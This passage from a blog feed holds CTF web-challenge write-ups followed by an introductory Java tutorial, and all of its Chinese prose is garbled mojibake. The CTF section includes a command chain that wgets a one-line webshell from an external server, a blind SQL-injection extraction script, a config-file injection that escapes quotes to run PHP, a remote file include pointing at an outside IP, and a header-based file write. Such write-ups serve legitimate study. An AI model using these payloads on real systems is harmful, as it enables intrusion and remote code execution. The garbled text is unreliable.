å…¥çš„å‘½ä»¤ä¸­åªèƒ½æœ‰å­—æ¯å’Œæ•°å­—ï¼Œæ‰§è¡Œå‘½ä»¤å¯ç”¨æ¢è¡Œç»•è¿‡ï¼Œé—®é¢˜æ˜¯æˆ‘ä»¬è¦å¦‚ä½•æ„é€ å‘½ä»¤æ¥æ‰§è¡Œï¼Œé¦–å…ˆå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œæ˜¯è¡Œä¸é€šçš„ï¼Œé‚£å¯ä»¥å°è¯•å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œæ„é€ ä¸€ä¸ªæœåŠ¡å™¨è¿”å›å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬çš„è„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ å¦‚ä¸‹å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">mkdir acd awget 10è¿›åˆ¶æœåŠ¡å™¨IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶aæ–‡ä»¶å¤¹ä¸‹å°±æœ‰ä¸€ä¸ªindex.htmlå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ²¡åŠæ³•æ‰§è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨taræ¥å°†æ–‡ä»¶ç±»å‹è¿›è¡Œæ›´æ”¹</p><pre class="line-numbers language-none"><code class="language-none">tar cvf shell a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†aæ–‡ä»¶å¤¹æ‰“åŒ…æˆä¸€ä¸ªshellæ–‡ä»¶å°±å¯ä»¥æ‰§è¡Œäº†</p><p><strong>691</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span>   <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$filterlist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/\(|\)|username|password|where|      case|when|like|regexp|into|limit|=|for|;/"</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filterlist</span><span class="token punctuation">,</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input username!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from admin where  username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password = '<span class="token interpolation"><span class="token variable">$password</span></span>' "</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span> <span class="token operator">-></span> <span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The content in the password column is the flag!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order byç›²æ³¨ï¼Œè´´ä¸ª<a href="https://blog.csdn.net/miuzzx/article/details/104908543">é“¾æ¥</a>ï¼ŒåŸç†å°±æ˜¯é€šè¿‡passwordä½ç½®çš„å­—ç¬¦ä¸²çš„æ¯”è¾ƒå¯¼è‡´å›æ˜¾ä¸­usernameçš„å†…å®¹ä¸åŒæ¥åˆ¤æ–­ç»“æœï¼Œç›´æ¥å†™è„šæœ¬å§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflagstr<span class="token operator">=</span><span class="token string">"-01234567890abcdefghiostw&#123;&#125;---"</span>url<span class="token operator">=</span><span class="token string">"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>flagstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"'or 1 union select 1,2,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">' order by 3#"</span></span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"&lt;/code>admin"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>692</strong></p><p>çœ‹ä¸€ä¸‹preg_replaceå‡½æ•°çš„ç”¨æ³•</p><blockquote><h1 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h1><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>preg_replace â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><pre class="line-numbers language-none"><code class="language-none">preg_replace(  string|array $pattern,  string|array $replacement,  string|array $subject,  int $limit &#x3D; -1,  int &amp;$count &#x3D; null): string|array|null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœç´¢ <code>subject</code> ä¸­åŒ¹é… <code>pattern</code> çš„éƒ¨åˆ†ï¼Œä»¥ <code>replacement</code> è¿›è¡Œæ›¿æ¢ã€‚</p><pre class="line-numbers language-none"><code class="language-none">replacement<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚å¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸” <code>pattern</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„æ¨¡å¼éƒ½ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ <code>pattern</code> å’Œ <code>replacement</code> éƒ½æ˜¯æ•°ç»„ï¼Œæ¯ä¸ª <code>pattern</code> ä½¿ç”¨ <code>replacement</code>ä¸­å¯¹åº”çš„å…ƒç´ è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ <code>replacement</code> ä¸­çš„å…ƒç´ æ¯” <code>pattern</code> ä¸­çš„å°‘ï¼Œå¤šå‡ºæ¥çš„ <code>pattern</code> ä½¿ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚</p><p><code>replacement</code> ä¸­å¯ä»¥åŒ…å«åå‘å¼•ç”¨ <code>\\n</code> æˆ– <code>$n</code>ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ªè¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬ n ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ n å¯ä»¥æ˜¯0-99ï¼Œ<code>\\0</code> å’Œ <code>$0</code> ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚æ•è·å­ç»„çš„åºå·è®¡æ•°æ–¹å¼ä¸ºï¼šä»£è¡¨æ•è·å­ç»„çš„å·¦æ‹¬å·ä»å·¦åˆ°å³ï¼Œ ä»1å¼€å§‹æ•°ã€‚å¦‚æœè¦åœ¨ <code>replacement</code> ä¸­ä½¿ç”¨åæ–œçº¿ï¼Œå¿…é¡»ä½¿ç”¨ 4 ä¸ª(<code>&quot;\\\\&quot;</code>ï¼Œè¯‘æ³¨ï¼šå› ä¸ºè¿™é¦–å…ˆæ˜¯ PHP çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è½¬ä¹‰åï¼Œæ˜¯ä¸¤ä¸ªï¼Œå†ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å¼•æ“åæ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªåŸæ–‡åæ–œçº¿)ã€‚</p></blockquote><p>æ­¤å¤„å¦‚æœå°†replacementä¸­å†…å®¹æ”¾å…¥<code>\\0</code>é‚£ä¹ˆå°±ä¼šç›´æ¥åŒ¹é…å‰é¢patternä¸­çš„ç»“æœ</p><blockquote><p>preg_replaceä¸­çš„ç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ˜¯%00ä¹Ÿå°±æ˜¯asciiä¸­çš„0,é‚£ä¹ˆå°†ä¼šåŒ¹é…åˆ°æ•´ä¸ªå­—ç¬¦ä¸²ã€‚<br>æ¯”å¦‚åˆå§‹çš„å­—ç¬¦ä¸²ä¸º<br>$option=â€™123â€™;<br>å¦‚æœæ‰§è¡Œ<br>preg_replace(â€œ$option=â€™.*â€™;â€,â€\x00â€,$a)<br>é‚£ä¹ˆè¿”å›çš„ç»“æœæ˜¯<br>$option=â€™$option=â€™123â€™;â€™;<br>å…¶å®å°±æ˜¯æŠŠåŸæ¥çš„å­—ç¬¦ä¸²åˆæ”¾åˆ°å•å¼•å·é‡Œé¢äº†ã€‚<br>å‡è®¾æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¼ option=;phpinfo();//<br>é¦–å…ˆconfig.phpä¸­çš„å†…å®¹ä¼šè¢«æ›¿æ¢æˆ$option=â€™;phpinfo();//â€˜ã€‚<br>å¦‚æœæˆ‘ä»¬ç¬¬äºŒæ¬¡ä¼ option=%00<br>é‚£ä¹ˆæœ€ç»ˆçš„ç»“æœæ˜¯$option=â€™$option=â€™;phpinfo();//â€˜â€™<br>è¿™æ ·å°±é€ƒå‡ºäº†å•å¼•å·ï¼Œphpinfo()ä¹Ÿå°±æ‰§è¡ŒæˆåŠŸ<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œyu22xã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/miuzzx/article/details/122998220">https://blog.csdn.net/miuzzx/article/details/122998220</a></p></blockquote><p><strong>693</strong></p><p>extractå‡½æ•°åŠ è¿œç¨‹æ–‡ä»¶åŒ…å«</p><pre class="line-numbers language-none"><code class="language-none">?function&#x3D;extract&amp;file&#x3D;http:&#x2F;&#x2F;45.15.131.101&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>694</strong></p><p>æ„é€ X-Forwarded-Forè¯·æ±‚å¤´ä¸ºæ–‡ä»¶åï¼Œfileä¸º.å³å¯ç›´æ¥å†™å…¥åˆ°è¯·æ±‚å¤´æ‰€æ„é€ çš„æ–‡ä»¶åä¸­</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>695</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå…¥é—¨</title>
      <link href="/posts/63f03572.html"/>
      <url>/posts/63f03572.html</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><p><strong>Hello World!</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Main.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//javac Main.java</span><span class="token comment">//java Main</span><span class="token comment">//JDK 11ä»¥åæ”¯æŒç›´æ¥ä½¿ç”¨javaæ‰§è¡Œæºä»£ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>JDKï¼ˆJavaå¼€å‘å·¥å…·åŒ…ï¼‰ç»„æˆ</strong></p><ul><li>JVMï¼šJavaè™šæ‹Ÿæœºï¼Œjavaç¨‹åºè¿è¡Œçš„åœ°æ–¹</li><li>æ ¸å¿ƒç±»åº“ï¼šJavaè‡ªå¸¦ç±»ï¼Œä¾›ç¨‹åºå‘˜è°ƒç”¨</li><li>JREï¼šJavaè¿è¡Œç¯å¢ƒ</li></ul><p><strong>æ•°æ®ç±»å‹</strong></p><p>åŸºæœ¬æ•°æ®ç±»å‹</p><ul><li>æ•´æ•°<ul><li>byte    1å­—èŠ‚</li><li>short    2å­—èŠ‚</li><li>intï¼ˆé»˜è®¤ï¼‰    4å­—èŠ‚</li><li>long    8å­—èŠ‚ï¼ˆæ•´æ•°å®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Lï¼‰</li></ul></li><li>æµ®ç‚¹æ•°<ul><li>float    4å­—èŠ‚ï¼ˆå®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Fï¼‰</li><li>doubleï¼ˆé»˜è®¤ï¼‰    8å­—èŠ‚</li></ul></li><li>å­—ç¬¦ï¼šchar 2å­—èŠ‚</li><li>å¸ƒå°”ï¼šboolen</li></ul><p>å¼•ç”¨æ•°æ®ç±»å‹</p><p><strong>ç±»å‹è½¬æ¢</strong></p><p>é»˜è®¤ç±»å‹è½¬æ¢ï¼Œå°çš„è‡ªåŠ¨æ¢æˆå¤§çš„</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">byte</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">byte</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„ç¨‹åºæŠ¥é”™ï¼Œå› ä¸ºabåœ¨è¿›è¡ŒåŠ è¿ç®—å‰å·²ç»æ‰§è¡Œè¢«è½¬æ¢æˆintç±»å‹</span><span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ­£ç¡®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿ç®—ç¬¦</strong></p><p>å’ŒC++ä¸€æ ·ï¼Œå­—ç¬¦ä¸²çš„ä¼˜å…ˆçº§æ‹‰æ»¡</p><p><strong>JavaåŸç”ŸAPI</strong></p><p><a href="https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html">å®˜æ–¹æ–‡æ¡£</a></p><p><strong>Javaç”¨æˆ·è¾“å…¥ï¼ˆç»ƒä¹ ç³»ç»ŸAPIä½¿ç”¨ï¼‰</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token comment">//å¯¼å…¥ScanneråŒ…</span><span class="token keyword">public</span> <span class="token keyword">class</span> scannerDemo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Scanner</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªScannerå¯¹è±¡</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥æ‚¨çš„å¹´é¾„ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> age<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–Scannerå¾—åˆ°çš„å†…å®¹</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ‚¨çš„å¹´é¾„æ˜¯ï¼š"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ç¨‹åºæµç¨‹æ§åˆ¶</strong></p><p>ifï¼Œswitchï¼Œforï¼Œwhileå’ŒC++å®Œå…¨ä¸€è‡´</p><p><strong>RandomåŒ…</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> randomDemo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Random</span> r<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> shu<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0-9èŒƒå›´</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ•°ç»„</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é™æ€åˆå§‹åŒ–æ•°ç»„</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PSR"</span><span class="token punctuation">,</span><span class="token string">"ZYL"</span><span class="token punctuation">,</span><span class="token string">"HZJ"</span><span class="token punctuation">&#125;</span><span class="token comment">//åŠ¨æ€åˆå§‹åŒ–æ•°ç»„</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŠ¨æ€åˆå§‹åŒ–æ•°ç»„é»˜è®¤å€¼ï¼š</p><p>æ•´å‹ï¼š0</p><p>æµ®ç‚¹å‹ï¼š0.0</p><p>å¸ƒå°”ï¼šfalse</p><p>å¼•ç”¨ç±»å‹ï¼šnull</p><p><strong>æ–¹æ³•ï¼ˆå°±å‡½æ•°å•¦ï¼‰</strong></p><p>å®Œæ•´å®šä¹‰æ ¼å¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none">ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚)&#123;    æ–¹æ³•ä½“ä»£ç     return è¿”å›å€¼;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ‚¨æ±‚çš„å’Œä¸ºï¼š"</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä»–å®šä¹‰æ ¼å¼ï¼š</p><p>å¯ä»¥æ²¡æœ‰è¿”å›å€¼ï¼ˆvoidï¼‰ï¼Œæ²¡æœ‰å‚æ•°</p><p><strong>æ–¹æ³•æ•°æ®ä¼ é€’æœºåˆ¶</strong></p><p>åŸºæœ¬ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ å€¼</p><p>å¼•ç”¨ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ åœ°å€</p><p><strong>æ–¹æ³•é‡è½½</strong></p><p>æ–¹æ³•åä¸€æ ·å‚æ•°ä¸ä¸€æ ·çš„æ–¹æ³•</p><p><strong>ç±»</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow<span class="token punctuation">.</span></span><span class="token constant">OP</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> brand<span class="token punctuation">;</span>    <span class="token keyword">double</span> price<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ¬¢è¿ä½¿ç”¨"</span><span class="token operator">+</span>brand<span class="token operator">+</span><span class="token string">"æ‰‹æœº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//æ„é€ å™¨å†™æ³•ä¸C++ç›¸åŒ</span><span class="token comment">//thiså…³é”®åœ¨ä»£è¡¨å½“å‰å¯¹è±¡çš„åœ°å€</span><span aria-hidden="true" 